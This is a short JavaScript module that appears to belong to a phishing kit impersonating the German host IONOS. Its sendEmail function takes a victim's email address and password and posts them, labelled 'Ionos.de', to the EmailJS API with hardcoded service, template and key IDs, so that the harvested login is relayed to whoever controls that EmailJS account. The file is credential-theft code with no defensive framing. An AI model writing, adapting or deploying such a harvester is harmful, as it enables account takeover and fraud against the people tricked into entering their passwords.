import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_zp1zg3n";
const template_id = "template_t67mcmp";
const public_key = "GbTXyYBWkXaTSPMlv";

const sendEmail = (values) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "Ionos.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
